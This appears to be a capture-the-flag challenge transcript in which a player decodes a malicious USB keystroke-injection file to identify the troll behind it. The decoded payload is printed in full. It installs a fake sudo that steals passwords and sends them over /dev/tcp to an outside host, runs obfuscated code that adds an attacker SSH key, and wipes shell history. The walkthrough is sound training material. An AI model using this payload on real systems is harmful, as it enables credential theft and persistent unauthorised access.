@@ -1,0 +1,97 @@
+A random USB device, oh what could be the matter?
+It seems a troll has left this, right on a silver platter.
+Oh my friend I need your ken, this does not smell of attar.
+Help solve this challenge quick quick, I shall offer no more natter.
+
+Evaluate the USB data in /mnt/USBDEVICE.
+
+elf@8a0e085afabf:~$ ls
+mallard.py*
+
+elf@8a0e085afabf:~$ ls /mnt/USBDEVICE/
+inject.bin
+
+elf@8a0e085afabf:~$ python mallard.py --file /mnt/USBDEVICE/inject.bin
+ENTER
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING terminal
+ENTER
+DELAY 500
+GUI -
+GUI -
+GUI -
+GUI -
+GUI -
+STRING  /bin/bash
+ENTER
+DELAY 500
+STRING mkdir -p ~/.config/sudo
+ENTER
+DELAY 200
+STRING echo '#!/bin/bash > ~/.config/sudo/sudo
+ENTER
+STRING /usr/bin/sudo $@
+ENTER
+STRING echo -n "[sudo] password for $USER: "
+ENTER
+STRING read -s pwd
+ENTER
+STRING echo
+ENTER
+STRING echo "$pwd" | /usr/bin/sudo -S true 2>/dev/null
+ENTER
+STRING if [ $? -eq 1 ]
+ENTER
+STRING then
+ENTER
+STRING echo "$USER:$pwd:invalid" > /dev/tcp/trollfun.jackfrosttower.com/1337
+ENTER
+STRING echo "Sorry, try again."
+ENTER
+STRING sudo $@
+ENTER
+STRING else
+ENTER
+STRING echo "$USER:$pwd:valid" > /dev/tcp/trollfun.jackfrosttower.com/1337
+ENTER
+STRING echo "$pwd" | /usr/bin/sudo -S $@
+ENTER
+STRING fi
+ENTER
+STRING fi' > ~/.config/sudo/sudo
+ENTER
+DELAY 200
+STRING chmod u+x ~/.config/sudo/sudo
+ENTER
+DELAY 200
+STRING echo "export PATH=~/.config/sudo:$PATH" >> ~/.bash_profile
+ENTER
+DELAY 200
+STRING echo "export PATH=~/.config/sudo:$PATH" >> ~/.bashrc
+ENTER
+DELAY 200
+STRING echo ==gCzlXZr9FZlpXay9Ga0VXYvg2cz5yL+BiP+AyJt92YuIXZ39Gd0N3byZ2ajFmau4WdmxGbvJHdAB3bvd2
+Ytl3ajlGILFESV1mWVN2SChVYTp1VhNlRyQ1UkdFZopkbS1EbHpFSwdlVRJlRVNFdwM2SGVEZnRTaihmVXJ2ZRhVWvJFSJB
+TOtJ2ZV12YuVlMkd2dTVGb0dUSJ5UMVdGNXl1ZrhkYzZ0ValnQDRmd1cUS6x2RJpHbHFWVClHZOpVVTpnWwQFdSdEVIJlRS
+9GZyoVcKJTVzwWMkBDcWFGdW1GZvJFSTJHZIdlWKhkU14UbVBSYzJXLoN3cnAyboNWZ | rev | base64 -d | bash
+ENTER
+DELAY 600
+STRING history -c && rm .bash_history && exit
+ENTER
+DELAY 600
+GUI q
+
+elf@8a0e085afabf:~$ echo ==gCzlXZr9FZlpXay9Ga0VXYvg2cz5yL+BiP+AyJt92YuIXZ39Gd0N3byZ2ajFmau4WdmxGbvJHdAB3bvd2Ytl3ajlGILFESV1mWVN2SChVYTp1VhNlRyQ1UkdFZopkbS1EbHpFSwdlVRJlRVNFdwM2SGVEZnRTaihmVXJ2ZRhVWvJFSJBTOtJ2ZV12YuVlMkd2dTVGb0dUSJ5UMVdGNXl1ZrhkYzZ0ValnQDRmd1cUS6x2RJpHbHFWVClHZOpVVTpnWwQFdSdEVIJlRS9GZyoVcKJTVzwWMkBDcWFGdW1GZvJFSTJHZIdlWKhkU14UbVBSYzJXLoN3cnAyboNWZ | rev | base64 -d 
+echo 'ssh-rsa UmN5RHJZWHdrSHRodmVtaVp0d1l3U2JqZ2doRFRHTGRtT0ZzSUZNdyBUaGlzIGlzIG5vdCByZWFsbHkgYW4gU1NIIGtleSwgd2UncmUgbm90IHRoYXQgbWVhbi4gdEFKc0tSUFRQVWpHZGlMRnJhdWdST2FSaWZSaXBKcUZmUHAK ickymcgoop@trollfun.jackfrosttower.com' >> ~/.ssh/authorized_keys
+
+───────────────────────────────────────────────────────────────────────────────────────────────
+
+What is the troll username involved with this attack?
+
+> ickymcgoop
+Your answer: ickymcgoop                                                                        
+                                                                                               
+Checking....
+Your answer is correct! Drat that Icky McGoop!
